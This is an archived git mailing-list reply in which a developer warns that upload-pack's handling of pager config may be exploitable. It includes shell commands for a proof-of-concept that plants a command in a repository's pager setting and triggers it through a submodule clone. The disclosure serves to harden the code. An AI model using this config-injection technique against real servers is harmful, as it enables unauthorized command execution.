Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-3.4 required=3.0 tests=AWL,BAYES_00,
	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,T_RP_MATCHES_RCVD
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id 7CAEE1F404
	for <e@80x24.org>; Thu, 22 Feb 2018 22:21:51 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1751772AbeBVWVu (ORCPT <rfc822;e@80x24.org>);
        Thu, 22 Feb 2018 17:21:50 -0500
Received: from cloud.peff.net ([104.130.231.41]:33428 "HELO cloud.peff.net"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
        id S1751763AbeBVWVs (ORCPT <rfc822;git@vger.kernel.org>);
        Thu, 22 Feb 2018 17:21:48 -0500
Received: (qmail 3418 invoked by uid 109); 22 Feb 2018 22:21:48 -0000
Received: from Unknown (HELO peff.net) (10.0.1.2)
 by cloud.peff.net (qpsmtpd/0.94) with SMTP; Thu, 22 Feb 2018 22:21:48 +0000
Authentication-Results: cloud.peff.net; auth=none
Received: (qmail 9505 invoked by uid 111); 22 Feb 2018 22:22:36 -0000
Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
 by peff.net (qpsmtpd/0.94) with (ECDHE-RSA-AES256-GCM-SHA384 encrypted) SMTP; Thu, 22 Feb 2018 17:22:36 -0500
Authentication-Results: peff.net; auth=none
Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Thu, 22 Feb 2018 17:21:46 -0500
Date:   Thu, 22 Feb 2018 17:21:46 -0500
From:   Jeff King <peff@peff.net>
To:     Jonathan Nieder <jrnieder@gmail.com>
Cc:     Brandon Williams <bmwill@google.com>,
        Jonathan Tan <jonathantanmy@google.com>, git@vger.kernel.org,
        sbeller@google.com, gitster@pobox.com, stolee@gmail.com,
        git@jeffhostetler.com, pclouds@gmail.com
Subject: Re: [PATCH v3 04/35] upload-pack: convert to a builtin
Message-ID: <20180222222146.GA30988@sigill.intra.peff.net>
References: <20180207011312.189834-1-bmwill@google.com>
 <20180207011312.189834-5-bmwill@google.com>
 <20180221134422.2386e1aca39fe673235590e7@google.com>
 <20180222095833.GC12442@sigill.intra.peff.net>
 <20180222180715.GB185096@google.com>
 <20180222181400.GA19035@sigill.intra.peff.net>
 <20180222193814.GA256918@aiede.svl.corp.google.com>
 <20180222201940.GB23561@sigill.intra.peff.net>
 <20180222212402.GB256918@aiede.svl.corp.google.com>
 <20180222214402.GA30638@sigill.intra.peff.net>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
In-Reply-To: <20180222214402.GA30638@sigill.intra.peff.net>
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

On Thu, Feb 22, 2018 at 04:44:02PM -0500, Jeff King wrote:

> But I don't think it _is_ an accident waiting to happen for the rest of
> the commands. upload-pack is special. The point is that people may touch
> git.c thinking they are adding a nice new feature (like pager config, or
> aliases, or default options, or whatever). And it _would_ be a nice new
> feature for most commands, but not for upload-pack, because its
> requirements are different.
> 
> So thinking about security in the git wrapper is just a burden for those
> other commands.

All of that said, I think the current code is quite dangerous already,
and maybe even broken.  upload-pack may run sub-commands like rev-list
or pack-objects, which are themselves builtins.

For example:

  git init --bare evil.git
  git -C evil.git --work-tree=. commit --allow-empty -m foo
  git -C evil.git config pager.pack-objects 'echo >&2 oops'
  git clone --no-local evil.git victim

That doesn't _quite_ work, because we route pack-objects' stderr into a
pipe, which suppresses the pager. But we don't for rev-list, which we
call when checking reachability. It's a bit tricky to get a client to
trigger those for a vanilla fetch, though. Here's the best I could come
up with:

  git init --bare evil.git
  git -C evil.git --work-tree=. commit --allow-empty -m one
  git -C evil.git config pager.rev-list 'echo >&2 oops'

  git init super
  (
	cd super
	# obviously use host:path if you're attacking somebody over ssh
	git submodule add ../evil.git evil
	git commit -am 'add evil submodule'
  )
  git -C evil.git config uploadpack.allowReachableSHA1InWant true
  git -C evil.git update-ref -d refs/heads/master

  git clone --recurse-submodules super victim

I couldn't quite get it to work, but I think it's because I'm doing
something wrong with the submodules. But I also think this attack would
_have_ to be done over ssh, because on a local system the submodule
clone would a hard-link rather than a real fetch.

-Peff
